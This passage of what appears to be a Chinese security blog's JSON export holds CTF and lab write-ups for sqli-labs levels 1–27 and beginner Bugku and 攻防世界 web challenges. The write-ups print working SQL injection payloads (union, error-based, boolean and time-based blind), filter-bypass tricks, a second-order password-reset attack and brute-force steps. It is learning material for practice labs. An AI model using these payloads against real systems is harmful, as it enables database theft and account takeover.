-mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"sqli-labs练习-less23-27","slug":"sqli-labs练习-less23-27","date":"2021-10-21T07:35:08.000Z","updated":"2021-11-19T14:51:47.123Z","comments":true,"path":"2021/10/21/sqli-labs练习-less23-27/","link":"","permalink":"http://example.com/2021/10/21/sqli-labs%E7%BB%83%E4%B9%A0-less23-27/","excerpt":"由于校赛的wp已经出来了我就不写了，把sqli-labs的坑先给填了。 ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。","text":"由于校赛的wp已经出来了我就不写了，把sqli-labs的坑先给填了。 ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。 less-23刷了那么多花里胡哨的关卡，又回到了熟悉的GET顿时令人倍感亲切。不过原来的倍感亲切现在变得来势汹汹，我们发现关卡标题提示我们这关过滤了注释符“#”和“–”，我们先来查看源码： 12345$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id); 这行代码的原理就是检测到id中存在注释符时使用空代替，因此平常的注释方法就失效了，不过我们还有其他的方法——闭合语句法。原来我们要使用注释符是因为我们手动加上了一个单引号导致源码中单引号无法匹配，因此使用注释符将后面的单引号注释掉。不过这个方法现在行不通了，那我们就换个思路，手动闭合单引号就可以了。 我们可以使用or&#39;1或者or&#39;1&#39;=&#39;1来进行闭合，效果如下： 不过此处我们无法用单引号闭合在执行order by语句，由于order by之后需要使用数字，这里加入引号使数字转换成了字符串导致错误，我们在这里介绍另一个绕过方法，使用%00： 具体原理可以参照下面这个链接，简单来说%00截断也就是0x00，系统在读取到0x00后就会停止继续读取，从而起到过滤后面单引号的作用：0x00截断原理 不过既然是截断了，我们在构建注入语句时一定要记得加上分号，效果如下： 这样就解决了我们order by的使用问题，接下来就可以进行爆库了。 less-24一道POST题，我们发现这道题就比较复杂了，页面中有很多选项，有忘记密码，有创建账户，原页面是登录。根据标题内容提示我们这关是双重注入，我们先介绍一下双重注入： 首先我们在http请求中提交一次恶意输入使其保存进数据库中，接着我们第二次提交http请求，为了响应这次的请求程序会检索数据库中的恶意输入，成功则会返回对应结果。 了解原理后，接下来我们来审查源码，首先是index.php，一上来就是这串代码： 1234session_start();if (isset($_SESSION[&#x27;username&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;Auth&#x27;])) &#123; header(&#x27;Location: logged-in.php&#x27;);&#125; Session_start()：开始一个会话或者返回已经存在的会话，session函数保证了cookie可以在多个页面中被应用。我们继续审查，会发现几乎每个POST点都被保护的很严密，除了pass_change.php；中的username参数是直接通过session传入的，这就意味着这里存在注入点。 那么我们首先创造一个账户，用户名为admin’#。注意，字符的转义是暂时的，不会影响存入数据库中的值。 为什么我们这里要取这个名字，我们来分析更改密码的update代码：$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;; 这里我们的username对应的值为admin’#,代入代码后我们得到的指令是这样的：$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;; 一目了然，username中的单引号闭合了代码中的单引号，而#起到了过滤作用，使得我们无需验证原密码也可以进行改密，接着我们就可以把admin的密码进行更改了。 没错，之前写到的admin密码123456我就是在这关改的。最后我们更改密码并登陆admin，解题成功。 less-25&amp;25a这两关本质上是一样的，放一起讲。这关的提示文字都已经贴在我们脸上告诉我们除了注释符，and和or都不能用了。那么首先，23关的%00截断法在这关仍然适用，但如果这样那就和less-23没区别了，那我们换种方法。 这个替换的原理是检测到or或者and就替换成空格，那么我们可以套娃，套一个anandd或者oorr出来，系统过滤了其中的and和or后，我们还能剩下一个and和or，要注意，只要存在and和or，不管是在单词中还是单独的，我们都需要进行套娃，例如information我们就要写成infoorrmation。 除此之外，将URL进行编码也是可以的，URL编码直接使用burp suite就可以了。如果是单独的and和or的话，我们也可以用&amp;&amp;和||替换，网上说大小写变形可以注入，但我测试了是不行的，查看源码也是说不区分大小写。 25a由于没有回显，因此使用盲注就可以了。 less-26&amp;26a现在这关向着不做人更进一步，空格也给过滤掉了，不过问题也不大，对空格的过滤我们有一套完整的解决方案： 特殊字符（%号家族）：包括但不限于%20 %09 %0a %0b %0c %0d %a0 注释：/**/ 使用括号，记得要闭合每个括号 常用的方法就是以上三者，这里使用括号来做示范：http://127.0.0.1/Less-26/?id=1%27oorr(extractvalue(1,concat(0x7e,(database()),0x7e)))aandnd%20%271%27=%271 用联合注入当然也可以。要注意，注释方法也被过滤了，而特殊字符在windows中可能出现无法被替换成空格的问题，因此在windows下建议使用括号进行绕过。 26a中采用的过滤方式为单引号+括号，且关闭了错误回显，因此只能使用盲注，具体情况和26关一样。 less-27&amp;27a这关就没有过滤and和or了，但是我们失去了union和select，同时我们发现有些过滤语句后面的反斜杠上有m或s，这是什么意思呢，这是设定的修正符，修正符的具体效果参照下面这个链接：正则表达式中的修正符 不过我们发现这里的union select可以使用混合大小写来绕过，而且源码中的正则表达式意味着只要含有就会被过滤，套娃方法在这关就失效了。同时这关的负号也被过滤了，因此id值应该GET一个例如999的数。最后进行爆库就行了。当然报错与盲注一样都是可以的。 27a同样是没有报错，与27没有什么差别，盲注就行了。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"攻防世界","slug":"攻防世界","date":"2021-10-17T08:19:20.000Z","updated":"2021-12-01T08:28:48.605Z","comments":true,"path":"2021/10/17/攻防世界/","link":"","permalink":"http://example.com/2021/10/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/","excerpt":"前言由于要准备校赛这周就没有刷sqli靶场了，这篇文章主要写攻防世界中web的部分新手题和进阶题，等校赛环境开了就把校赛的wp写了，下周继续刷靶场。","text":"前言由于要准备校赛这周就没有刷sqli靶场了，这篇文章主要写攻防世界中web的部分新手题和进阶题，等校赛环境开了就把校赛的wp写了，下周继续刷靶场。 command_execution这题难度不是很高，但在web新手题里应该算是最难的了，这题要求我们运用到linux常用指令。不过在这之前，先简单说下提示中的waf，waf为web提供保护，可以有效防护sql注入等等手段，可以和防火墙结合起来一起理解。 接着我们再介绍linux的命令执行中的“&amp;”和“|”的作用： 1234c1 &amp;&amp; c2 先执行c1再执行c2c1 &amp; c2 先执行c2后执行c1c1 || c2 c1执行失败后执行c2，反之不执行c2c1 | c2 只执行c2 除了这些，我们还得了解linux基本指令。这题我们使用了ls指令和cat指令： 12ls 查看目录文件cat 读取文件 了解了这些，我们就可以解题了。我们直接查找当前目录下的文件： 就像这样，我们一级一级往上查找，找到根目录后进入home中，我们就可以发现flag就躺在里面，用cat指令打开查看就好了。 simple_js按照道理来说，见面就要输密码的题，一般不太可能字典爆破的出来，再结合题目指向了js，那么我们就去查看网页的js 1234567891011121314151617181920212223242526272829&lt;html&gt;&lt;head&gt; &lt;title&gt;JS&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; function dechiffre(pass_enc)&#123; var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;; var tab = pass_enc.split(&#x27;,&#x27;); var tab2 = pass.split(&#x27;,&#x27;);var i,j,k,l=0,m,n,o,p = &quot;&quot;;i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i])); if(i == 5)break;&#125; for(i = (o=0); i &lt; (k = j = n); i++ )&#123; o = tab[i-l]; if(i &gt; 5 &amp;&amp; i &lt; k-1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p;return pass; &#125; String[&quot;fromCharCode&quot;](dechiffre(&quot;\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30&quot;)); h = window.prompt(&#x27;Enter password&#x27;); alert( dechiffre(h) );&lt;/script&gt;&lt;/head&gt;&lt;/html&gt; 我们发现了一串/x……代码，这串代码的格式为十六进制码，我们把它转换为对应的ascii码值，得出的文本十进制再进行一次转换，得到密码为786OsErtk12，这就是flag内容。 isc-6根据题目我们进入报表中心，发现了熟悉的get点，这里下意识先进行sql注入，但发现全部尝试都失败了，果断排除sql注入。再经历了御剑，抓包的洗礼也没发现有问题，审计源码也没有问题，种种可能性都被排除，那么我们只能把目光锁定在id值上了。 写一个最简单的脚本： 12for m in range(10001): print(m) 输出的数据放入burp suite中进行字典爆破，发现当id值为2333时，返回的长度不同，那么我们把2333get上去，flag就显示出来了。 总结因为这周没做靶场，就拿这周练习的题目写了点wp，实际上做的题不止这些，不过有些因为过于简单，有些因为比较复杂，就都没有写出来，等实验室的比赛平台开了就去写比赛的wp。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"bugku-web练习","slug":"bugku练习","date":"2021-10-14T06:55:42.000Z","updated":"2021-12-01T08:28:56.440Z","comments":true,"path":"2021/10/14/bugku练习/","link":"","permalink":"http://example.com/2021/10/14/bugku%E7%BB%83%E4%B9%A0/","excerpt":"前言由于校赛要开始了，就做了些简单的题目练手，有bugku也有攻防世界的，这篇博客记录几题bugku的题。 滑稽看图实在费眼睛，直接f12查看源码找到flag走人就行了","text":"前言由于校赛要开始了，就做了些简单的题目练手，有bugku也有攻防世界的，这篇博客记录几题bugku的题。 滑稽看图实在费眼睛，直接f12查看源码找到flag走人就行了 计算器可以看到进入页面后是一道非常简单的计算题，答案一眼就能看出是70，但是我们打算输入时却发现，我们只能输入一个数字。使用f12查看源码，发现了这么一行：&lt;input type=&quot;text&quot; class=&quot;input&quot; maxlength=&quot;1&quot;&gt; 输入的最大长度为1，那么我们把1改成2，再输入进行验证就可以得到flag了。 GET &amp;&amp; POST非常直白的题目，这两题的页面都提供了php代码，分别以get和post上传一个waht=flag，flag就会回显出来了 矛盾我们分析这题的代码，可以知道我们需要以get的方式上传一个数值为1的非数字，这样看来确实是矛盾的。但是我们可以发现这里的判断符为==而并非===，因此不比较两个变量的类型，这样我们就可以输入字符串而并非数字来进行判断。这里我们get传入一个num=1a就可以了 头等舱web中与头相关我们首先想到的就是响应头和请求头了，因此这题直接查看网页的响应头，发现flag就在其中。 网站被黑这题一进去我们查看源码，抓包等都一无所获，因此我们要想到对网页进行路径扫描，这里我们用了御剑进行扫描，发现了shell.php，也就是被人上传木马了。 我们进入shell.php，发现需要密码，如果你能灵机一动猜出密码是hack的话，那恭喜你，得到了flag，否则的话还是老老实实进行字典爆破吧。 你必须让他停下进入页面后发现页面一直在刷新，但是在查看源码时可以发现有一次刷新是可以显示flag的，那么我们就耐心抓包，抓到flag就算成功。 本地管理员进入页面发现要输入账号密码，尝试输入后发现ip禁止访问，我们通过抓包添加一个xxf的请求头，将其设置为127.0.0.1，接着提示了无效凭证，那么估计就是密码的问题了，爆破密码直接无脑字典，爆出来密码为test123，最后登录获取flag。 总结以上八题都是比较简单的题目，主要接触了ctf题目的类型与解题思路，为周六的校赛做准备。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"sqli-labs练习-less18-22","slug":"sqli-labs练习-less18-22","date":"2021-10-07T12:05:42.000Z","updated":"2021-11-19T14:50:36.272Z","comments":true,"path":"2021/10/07/sqli-labs练习-less18-22/","link":"","permalink":"http://example.com/2021/10/07/sqli-labs%E7%BB%83%E4%B9%A0-less18-22/","excerpt":"前言接下来的几关我们需要用到抓包工具来帮助我们进行解题，我们用到了burp suite工具（需要JAVA环境），并且通过下面几个靶场具体分析学习这个工具的使用。ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。","text":"前言接下来的几关我们需要用到抓包工具来帮助我们进行解题，我们用到了burp suite工具（需要JAVA环境），并且通过下面几个靶场具体分析学习这个工具的使用。ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。 less-18首先进入网页，我们发现显示了当前的ip地址，但这似乎对我们并没有什么用。依然尝试随便输入，发现提示登录失败，简单注入也没有报错回显。我们去查看下源码，发现账户密码都被check_input函数保护起来了，因此我们显然不能在这个页面中进行注入了。 既然页面不能注入，我们就进行抓包操作，先随意输入一组账号密码，得到抓包结果： 想要进行注入操作，我们就要先了解这些请求头的含义，这里举几个常用的请求头为例： HOST：指定被请求资源的Internet主机与端口号 User-Agent：允许客户端将操作系统、浏览器等信息报告给服务器 Referer：当前访问的URL的上一个URL X-Forwarded-For：请求端IP Cookie：一段文本，一般用来储存用户资料，相当重要 不过在这里我们似乎找不到注入点，那我们试着输入一段正确的账户密码。我们这里有两种操作： 我们在Proxy下直接更改账户密码并将其forward，我们可以回到浏览器查看结果 我们使用ctrl+r将其发送到Repeater中，在并request中修改账户密码，将其go到response中，并在response中的render下查看结果 这里我们选方法2：ps：这里密码为123456是因为在做24关的时候改密了，正常密码应该也为admin 我们可以发现这时返回了User-Agent，我们可以通过源码分析这段的注入原理：$insert=&quot;INSERT INTO &#39;security&#39;.&#39;uagents&#39; (&#39;uagent&#39;, &#39;ip_address&#39;, &#39;username&#39;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;; 这段代码便是我们注入的关键，这一次不是select语句，而是insert语句。这段代码会在登陆成功后回显uagent，并将uagent、IP、uname插入到security数据库的uagents表的uagent、ip_address、username三个字段中。并且结合其他代码我们可以知道，只有输入正确的账号密码才能进入到这个insert语句，因此我们可以判断注入点就在User-Agent中。 找到注入点后，我们就可以通过之前使用过的很多语句进行爆库了：还可以使用时间盲注或者其他类型的报错等等，这里不再赘述。 less-19十九关与十八关的差别不大，输入admin发现这次回显的是Referer内容，那我们就猜测注入点在referer中，通过查询源码发现也确实如此，那么我们就可以进行爆库了。 less-20通过标题提示我们知道这道题的关键在于cookie上。我们先去查看一波源码，发现这次的select语句对$cookie进行了查询，那么我们大可判断这次的注入点在cookie中。 我们来先分析burp suite是如何进行这关的抓包的：首先先验证账户密码是否正确，如果正确的话就进行set cookie 接下来forward之后我们就可以发现cookie已经被记录了下来：同时我们得知cookie只记录下了uname，这时我们修改cookie为1，用浏览器开发者工具读取cookie，发现admin依然保存在value值中。我们就可以判断当页面request时，若cookie中存在uname则直接读取，因此这题注入点就在cookie中。 找到了注入点，我们就可以开始平平无奇的爆库了，直接简单的查询语句加注释就行。 less21-22到这里我们就进入了靶场的第二页了，恭喜自己能更进一步了。我们进入21关，基于base64的cookie注入。这里关于base64的知识可以参考下面这个文章：base64介绍 我们首先用burp suite进行抓包，发现这次的cookie中出现了这段代码：Cookie: uname=YWRtaW4%3D这里的%3D就是“=”，这是一段很经典的base64，不过我们自然不用一个个自己解码，burp suite中的Decoder模块中的decode as就可以进行base64的编码与解码，那么我们就先进行解码，结果为admin。 不过这题同第20关的区别也就在这里了，其他的操作与20关并无相异，注意注入是否有括号，接着我们只要将原来输入的代码先进性base64编码再注入就行了。 而第22关是基于双引号的报错，只要使用双引号就行了","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"sqli-labs练习-less8-17","slug":"sqli-labs练习-less8-17","date":"2021-10-02T04:56:56.000Z","updated":"2021-11-19T14:50:42.412Z","comments":true,"path":"2021/10/02/sqli-labs练习-less8-17/","link":"","permalink":"http://example.com/2021/10/02/sqli-labs%E7%BB%83%E4%B9%A0-less8-17/","excerpt":"前言接下来的三关就是盲注题了，盲注是SQL注入中最重要的技能，当页面中的数据无法回显到前端时，就需要借助盲注手段来判断。同时，盲注往往也带有着工具或脚本的使用，我们也可以借此机会进行学习。ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。","text":"前言接下来的三关就是盲注题了，盲注是SQL注入中最重要的技能，当页面中的数据无法回显到前端时，就需要借助盲注手段来判断。同时，盲注往往也带有着工具或脚本的使用，我们也可以借此机会进行学习。ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。 关于盲注盲注的使用要基于用户自己可以对输入进行控制，且要能接入进执行代码中。盲注分为两种：布尔盲注和时间盲注。 布尔盲注：通过返回true与false的不同，导致页面的回显不同进行判断，之前使用and 1=1与and 1=2判断注入点也是用此原理 时间盲注：通过返回true与false的不同，导致页面的加载时间不同进行判断，一般使用if语句 less-8标题就是基于单引号的布尔盲注，那我们先将id和单引号一起输入进去，然后发现这是一点报错都没有啊。我们可以查看源码，发现报错这一行（下列源码的第三行）被注释了： 123456echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;;//echo &#x27;You are in...........&#x27;;//print_r(mysql_error());//echo &quot;You have an error in your SQL syntax&quot;;echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; 那么这种情况下我们就需要使用盲注了。先用and 1=1和and 1=2判断，发现前者会回显一个“You are in….”，而后者依然是什么都没有，那么我们就知道了，当返回true时，页面会回显一句话，反之则什么都不回显。 既然掌握了原理，那么我们就可以开始准备注入了。下面我们来介绍我们需要用到的函数： length()：返回字符串的长度 substr(str,start,len):截取“str”字符串从第“start”位开始的“len”长度的字符 ascii()：返回字符的ascii码值，关于ascii码值可以参考下图： 正式开始注入，我们使用and或者or来对代码进行连接，一定要注意，and的true返回条件是左右两边都为真，or的true返回条件只需要有一边为真就行了，因此在这里前面id如果存在于数据库之中要用and，不存在则用or。由于刷POST题时犯了个蠢，在这里先提一下。 由于我们已经知道数据库的名称为security了，所以我们就不从猜数据库开始了，可以用length(database())先确定数据库名称的长度，再一位一位进行猜测。这里我们直接开始猜表。首先是表的个数： 1n=(select count(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27;) n可以替换为任何数，后面的查询语句也可以替换来查询表的列数等等。当返回true时，也就是我们看到“You are in….”时，代表着我们猜对了，我们就可以进行下一步猜表名了： 1ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),m,1))=n 这里我们用limit限制了查询的表为数据库中的第一个表，这个函数验证的是第一个表的第m个字段的ascii码是否为n，这个等号也可以替换为大于号或者小于号来帮助我们缩小范围。通过这种方法我们可以逐步推出第一个表的名字为emali。但是一个个试的效率是十分低的，我们可以用二分法来提高效率，或者学习如何使用脚本或者工具来帮助我们提高效率，这里就不展开了。 得到表的名称后，我们可以更改以上代码的查询语句一步步查询出我们想要的数据了。 less-9这关根据标题要使用时间盲注，但我先用了布尔盲注进行测试，结果发现无论返回true还是false，页面都会回显“You are in….”，查看源码就可以发现确实如此，因此这个靶场我们就要使用时间盲注了。 使用时间盲注时我们会用到if语句和sleep()函数进行配合： if(expr1,expr2,expr3)：当语句1返回的结果为true时，执行语句2，反之则执行语句3 sleep(x)：延迟执行脚本x秒 时间盲注有个很显著的优点，不需要通过页面回显来判断，在页面没有回显内容的时候，时间盲注就可以很好的帮助我们进行判断。例如我们同样来判断数据库中表的个数： 1if(n=(select count(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27;),sleep(3),1) 显而易见，当数据库中表的个数为n时，脚本将暂停3秒再执行，否则什么都不会发生，这样我们就可以通过观察网页的加载时间来判断返回值是true还是false。 这样一来，我们只要将if()中的语句1进行更改，就可以像less-8一样逐步获得数据库中的信息了。 less-10把单引号换成双引号，然后把less-9的过程走一遍，然后你就成功又做出了一关，这真是令人感到高兴呢（bushi）。 less11-16不说废话，直接上代码，以less-12的代码为例，下面也以less-12为例进行分析，其他的关卡都可以凭借题目进行注入，因此不再详解： 12345678910111213if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123; $uname=$_POST[&#x27;uname&#x27;]; $passwd=$_POST[&#x27;passwd&#x27;];...... // connectivity $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;; $passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); 我们可以发现从本质上来说，POST与GET的差别不是很大，作为HTTP请求的两种基本方法，他们最大的区别就在于GET是把参数写进了URL中，从指定的资源请求数据，而POST是向指定的资源提交要被处理的数据，是要我们上传数据的。两者具体的区别可以通过下面这篇文章学习：HTTP：GET对比POST 进入靶场我们可以发现多出了一个输入框，现在我们可以输入一个账号密码了，而不是在域名中输入一个id。通过上面的代码，比如当我们输入账号为1，密码为1后，就相当于POST了一个$uname=1&amp;$passwd=1，并且传入sql中进行查找，不过显然数据库中没有这一组账号密码，因此提示我们登录失败了。 注入的关键还是那行查询代码。我们发现查询代码中首先对我们POST的两个变量添加了双引号并且打上了括号，接着可以发现$uname在$passwd的前面，这就意味着我们从输入账户的那一栏添加注释可以屏蔽掉密码栏。知道这些后，我们就可以开始进行注入了注意：在使用注释“–+”时用空格代替“+”号，不然会报错，或者直接使用其他注释方法。 接下来就是使用order by爆字段，可以发现这次的字段数为2：这里也推荐使用火狐中的插件hackbar，可以去网上自行搜寻旧版本免费试用，新版本需要收费。 到此为止，剩下的事情就是熟悉的爆库了。熟练运用之前靶场中学会的查询、盲注等多种方法。特别提示，如果在做第十四关时发现标题和第十三关一样，那请你千万不要相信标题。 less-17第十七关它又不一样了。首先，当你在进行初始测试时，它会对你进行无情嘲讽，让你上头，但接着你发现无论怎样在账户中注入，都只有对你的嘲讽出现。你不得不冷静下来，翻开源码： 123456789101112131415161718192021222324function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; 我们发现了这段check_input函数，并且还发现了$uname这个变量进行了一次check_input函数。接下来我们详细分析一下这个函数： 第一个判断，如果输入的值不为空，截取最多15个字符，这意味着我们想进行注入的话只能保证字符在15个以内，现在对于我们来说这几乎是不可能的。 接着判断当前设置中get_magic_quotes_gpc是否开启了，如果开启了的话将会为通过get、post与cookie传来的数据中的引号前加入反斜杠，相当于自动为数据进行了一次addslashes()，因此如果开启，则通过stripslashes()函数删去其中的反斜杠。 最后判断输入的值是否为十进制纯数字，如果不是则将值中的特殊字符转义，否则取整。以下这些字符会被mysql_real_escape_string()转义：\\x00（空值），\\n（换行），\\r（回车） ，反斜杠，单引号，双引号，\\x1a（十六进制） 这段函数对用户名实行了保护，因此我们不能从用户名中入手了，但是翻看源码，它居然没有保护密码。因此我们只要获得一个合法的用户名，就可以从密码栏入手了： 1$uname=admin&amp;$passwd=&#x27; order by 3# 如此一来，我们就可以开始爆库了。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"sqli-labs练习-less1-7","slug":"sqli-labs练习-less1-7","date":"2021-09-26T08:25:32.000Z","updated":"2021-11-19T15:00:19.797Z","comments":true,"path":"2021/09/26/sqli-labs练习-less1-7/","link":"","permalink":"http://example.com/2021/09/26/sqli-labs%E7%BB%83%E4%B9%A0-less1-7/","excerpt":"前言在学习完php的基本语言和mysql增删查改语句后，我们已经初步具备了靶场练习的能力，让我们先从sqli-labs开始练习SQL注入。ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。 关于SQL注入在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达到欺骗服务器的目的，因此网站都会对用户输入的数据进行过滤来进行保护。","text":"前言在学习完php的基本语言和mysql增删查改语句后，我们已经初步具备了靶场练习的能力，让我们先从sqli-labs开始练习SQL注入。ps.整理了关于sqli-labs靶场的博客，将分散的几篇整合了起来。 关于SQL注入在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达到欺骗服务器的目的，因此网站都会对用户输入的数据进行过滤来进行保护。 而在练习靶场中，我们就需要通过SQL注入的方式获得数据库中的数据，接下来我们来具体分析sqli-labs靶场中的第一关来深刻认识SQL注入。 less1-4首先进入less-1的界面，我们可以看到一行字： Please input the ID as parameter with numeric value 那么我们就按照这句话的意思：请输入ID作为带数值的参数，在域名中输入一个ID：http://127.0.0.1/Less-1/?id=1接着按下回车后我们可以看到页面中出现了一对账号密码： 而根据提示（GET-Error based-Single quotes-String)可以知道，这道关卡是要利用源码中基于单引号的错误来进行解决，那么我们就尝试在域名结尾加上一个&#39;http://127.0.0.1/Less-1/?id=1&#39;回车后我们就可以发现网站报错了，如果没有报错的话，可以参考下面的链接关闭php的引号保护：关于Sqli-labs单引号不报错的问题而如果报错的话，我们会看到以下这段文字： You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1 那么为什么会出现这一段文字呢，我们借助文件的源码进行分析: 123456789101112131415161718192021222324252627282930if(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row) &#123; echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125; 通过分析以上部分源码，我们可以发现，当你输入一个id时，这个文件得到了一个id，if函数执行true下的代码段，将本次查询记录到result的txt文件中，并从数据库中查询，显示信息。因此当我们输入?id=1时网页能够返回账号密码。而当我们输入?id=1’时，我们可以发现，第11行代码得到id为1’后，即把$id替换为1’后，代码中出现了三个单引号，这就将导致单引号无法正确对应，引起报错。 既然多输入了一个单引号，我们就要想办法把多余出来的那个单引号排除掉，在SQL注入中，最常用的方法便是注释，我们在域名最后添加上注释符： 1http://127.0.0.1/Less-1/?id=1%27--+ 或者我们可以将–+替换为#（%23） 这样我们发现，回车后的页面重新显示正常，这时我们可以进行测试判断此处是否有注入点。我们可以使用and 1=1和and 1=2进行判断，其中1=1表示恒为真，1=2表示恒为假。通过下两图我们可以发现两者显示页面不同，说明在此处存在注入点： 既然存在注入点，我们就要想办法在此处获取我们需要的数据。由于第11行这句代码本身就是select语句，因此我们在进行查询时需要运用到union语句来合并两个select语句的结果。不过要注意，使用union语句的先决条件是语句内部的SELECT语句必须拥有相同数量的列，因此我们需要先获取表格中的字段数。使用order by语句进行字段数查询，当我们测试到order by 4时，发现文档页面出现了以下的提示： Unknown column ‘4’ in ‘order clause’ 无法识别第4列，这就说明表格中只有3列，我们就可以运用union语句来进行注入。首先我们将id改为-1，接着注入以下代码来获取显示页面对应的字段： 1union select 1,2,3 可以发现账户与密码两列对应的字段数为2和3，那么在下述的操作中，我们就可以将union语句中的2或3替换成新的select语句来获取我们想要的信息，例如我们可以将上述域名中的2替换为下列代码来查询全部数据库的名称： 1(select group_concat(schema_name) from information_schema.schemata) 或者使用将2替换为database()查询当前数据库的名称 这样我们就得到了我们要查找的数据库的名称，我们知道，数据存在于数据表里，而数据表又存在于数据库里，所以接下来我们需要获得数据库内所有表的名称。我们可以将原来2的位置继续替换成下列代码进行查询： 1select group_concat(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27; 取得了表名之后我们就可以想办法获得其中的数据了，数据储存在数据表的列当中，我们需要继续获得列名，这里我们获取users表中的列名，同样替换原来2的位置： 1select group_concat(column_name) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; 做到这里，我们就可以愉快的获取到我们想要的信息了 1select group_concat(列名) from 数据库名.数据表名 less-2是数字型注入，less-3是单引号括号闭合注入，less-4是双引号括号闭合注入。z这几关的考点是联合注入。 less5-6方法1进入第五个靶场，在我们输入id之后，我们会发现一切都变了，屏幕上只剩下一句“You are in……..”和在屏幕前一脸懵的我们。遇到这种情况先不要惊慌，还记得提示内容依然指向了单引号，既然如此，我们依然在域名最后先加上一个单引号。 回车来了，报错就有了。这是一段与less-1完全一致的报错，加上注释后回显恢复正常，再用and 1=1和and 1=2检验后可以确定这里存在注入点。既然存在注入点，那就有解开它的方法。但是显然，不管我们怎样更改id的值，得到的永远只有那句“You are in……..”。 